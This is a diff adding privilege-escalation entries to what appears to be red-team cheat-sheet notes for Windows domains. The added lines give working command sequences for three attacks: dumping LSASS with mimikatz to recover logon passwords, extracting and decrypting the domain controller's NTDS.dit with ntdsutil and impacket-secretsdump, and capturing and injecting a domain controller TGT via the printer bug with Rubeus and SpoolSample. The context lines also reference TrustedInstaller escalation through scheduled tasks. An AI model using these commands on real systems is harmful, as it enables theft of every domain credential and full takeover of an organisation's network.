@@ -73,6 +73,21 @@ Lateral Movement
   verify no powershell is running
   
 PrivEsc
+  MiniDump - Offline PW dump
+    .\createminidump.exe
+    .\mimikatz.exe
+    sekurlsa::minidump c:\temp\lsass.dmp
+    sekurlsa::logonpasswords
+    
+  Dump DC NTDS.dit
+    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+    /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
+    
+  Printer Bug (Get DC TGT from Unconstrained Delegation machine)
+      Rubeus monitor /interval:1 (monitors for TGT when spoolsample is run)
+      Spoolsample.exe DC01.FQDN Host_running_rubeus.fqdn
+      Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIB... (should not have valid TGT in memory)
+
   Schedule Tasks/Trusted Installer
     https://tyranidslair.blogspot.com/2019/09/the-art-of-becoming-trustedinstaller.html?m=1
       $a = New-ScheduledTaskAction -Execute notepad.exe
